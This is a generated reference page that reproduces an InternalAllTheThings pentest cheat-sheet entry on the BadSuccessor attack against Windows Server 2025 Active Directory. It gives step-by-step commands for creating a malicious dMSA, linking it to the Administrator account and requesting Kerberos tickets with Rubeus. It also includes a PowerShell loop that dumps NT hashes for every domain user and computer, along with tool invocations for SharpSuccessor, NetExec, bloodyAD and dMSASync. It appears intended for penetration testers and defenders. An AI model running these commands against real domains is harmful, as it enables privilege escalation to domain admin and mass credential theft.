---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - dMSA

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-read-dmsa` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-dmsa.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - dMSA](../../topics/active-directory/password-dmsa.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-read-dmsa |
| name | Password - dMSA |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-read-dmsa.md |

## Preserved Source Material

````yaml
_body: "# Password - dMSA\n\nDelegated Managed Service Accounts (dMSAs)\n\n## BadSuccessor\n\n**Requirements**:\n\n* Windows\
  \ Server 2025 Domain Controller\n* Permission on any organizational unit (OU) in the domain\n\n**Tools**:\n\n* [akamai/BadSuccessor/Get-BadSuccessorOUPermissions.ps1](https://github.com/akamai/BadSuccessor)\n\
  * [LuemmelSec/Pentest-Tools-Collection/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)\n\
  * [GhostPack/Rubeus PR #194](https://github.com/GhostPack/Rubeus/pull/194)\n* [CravateRouge/bloodyAD Commit #210f735](https://github.com/CravateRouge/bloodyAD/commit/210f735474a403dd64b218b84e98a27e157e7ed3)\n\
  * [skelsec/minikerberos/getDmsa.py](https://github.com/skelsec/minikerberos/blob/main/minikerberos/examples/getDmsa.py)\n\
  * [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)\n\n    ```ps1\n    SharpSuccessor.exe add /impersonate:Administrator\
  \ /path:\"ou=test,dc=lab,dc=lan\" /account:jdoe /name:attacker_dMSA\n    ```\n\n* [Pennyw0rth/NetExec PR #702](https://github.com/Pennyw0rth/NetExec/pull/702/commits/e75512a93cde0c893505fd806e169a2aa7a683db)\n\
  \n    ```ps1\n    poetry run netexec ldap 10.10.10.10 -u administrator -p Passw0rd -M badsuccessor\n    ```\n\n![badsuccessor-attack-flow](https://www.akamai.com/site/en/images/blog/2025/badsuccessor-image5.png)\n\
  \n**Manual Exploitation**:\n\n* Verify if the DC is a Server 2025\n\n    ```ps1\n    ldapsearch \"(&(objectClass=computer)(primaryGroupID=516))\"\
  \ dn,name,operatingsystem\n\n    # BloodHound Query\n    MATCH (c:Computer)\n    WHERE c.isdc = true AND c.operatingsystem\
  \ CONTAINS \"2025\"\n    RETURN c.name\n    ```\n\n* Create unfunctional dMSA\n\n    ```ps1\n    New-ADServiceAccount -Name\
  \ \"attacker_dmsa\" -DNSHostName \"dontcare.com\" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword\
  \ \"attacker-machine$\" -path \"OU=temp,DC=aka,DC=test\"\n    ```\n\n* Edit `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState`\
  \ values\n\n    ```ps1\n    # msDS-ManagedAccountPrecededByLink, targeted user or computer\n    # msDS-DelegatedMSAState=2,\
  \ completed migration\n    $dMSA = [ADSI]\"LDAP://CN=attacker_dmsa,OU=temp,DC=aka,DC=test\"\n    $dMSA.Put(\"msDS-DelegatedMSAState\"\
  , 2)\n    $dMSA.Put(\"msDS-ManagedAccountPrecededByLink\", \"CN=Administrator,CN=Users,DC=aka,DC=test\")\n    $dMSA.SetInfo()\n\
  \    ```\n\n* dMSA authentication with Rubeus\n\n    ```ps1\n    Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test\
  \ /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>\n    ```\n\n## Credential Dumping\n\n> When you request a TGT for a dMSA,\
  \ it comes with a new structure called KERB-DMSA-KEY-PACKAGE. This structure includes two fields: current-keys and previous-keys.\
  \ - Akamai Blog Post\n\nThe previous-keys field contains the RC4-HMAC of the password (NT Hash).\n\n```ps1\n.\\Invoke-BadSuccessorKeysDump.ps1\
  \ -OU 'OU=temp,DC=aka,DC=test'\n```\n\n* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\n\n    ```ps1\n    $domain\
  \ = Get-ADDomain\n    $dmsa = \"CN=mydmsa,CN=Managed Service Accounts,$($domain.DistinguishedName)\"\n    $allDNs = @(Get-ADUser\
  \ -Filter * | select @{n='DN';e={$_.DistinguishedName}}, sAMAccountName) + @(Get-ADComputer -Filter * | select @{n='DN';e={$_.DistinguishedName}},\
  \ SAMAccountName)\n    $allDNs | % {\n        Set-ADObject -Identity $dmsa -Replace @{ \"msDS-ManagedAccountPrecendedByLink\"\
  \ = $_.DN }\n        $res = Invoke-Rubeus asktgs /targeteduser:mydmsa$ /service:\"krbtgt/$(domain.DNSRoot)\" /opsec /dmsa\
  \ /nowrap /ticket:$kirbi\n        $rc4 = [regex]::Match($res, 'Previous Keys for .*\\$: \\(rc4_hmac\\) ([A-F0-9]{32})').Groups[1].Value\n\
  \        \"$($_.sAMAccountName):$rc4\"\n    }\n    ```\n\n* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)\n\
  \n    ```ps1\n    python bloodyAD.py --host 192.168.100.5 -d bloody.corp -u jeanne -p 'Password123!' get writable --otype\
  \ OU \n    python bloodyAD.py --host 192.168.100.5 -d bloody.corp -u jeanne -p 'Password123!' add badSuccessor dmsADM10\n\
  \    ```\n\n* [snovvcrash/dMSASync.py](https://gist.github.com/snovvcrash/a1ae180ab3b49acb43da8fd34e7e93df)\n\n    ```ps1\n\
  \    getTGT.py 'kerberos+aes://contoso.local\\user:AES_KEY@DC_IP' --ccache user.ccache\n    dMSASync.py 'contoso.local\\\
  user:user.ccache@DC01.contoso.local/?dc=DC_IP' 'CN=dmsa,CN=Managed Service Accounts,DC=contoso,DC=local'\n    ```\n\n##\
  \ References\n\n* [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory - Yuval Gordon - May 21, 2025](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)\n\
  * [Operationalizing the BadSuccessor: Abusing dMSA for Domain Privilege Escalation - Arun Nair - May 23, 2025](https://medium.com/seercurity-spotlight/operationalizing-the-badsuccessor-abusing-dmsa-for-domain-privilege-escalation-429cefc36187)\n\
  * [Understanding & Mitigating BadSuccessor - Jim Sykora - May 27 2025](https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/)"
_relative_path: active-directory/pwd-read-dmsa.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-dmsa.md
````
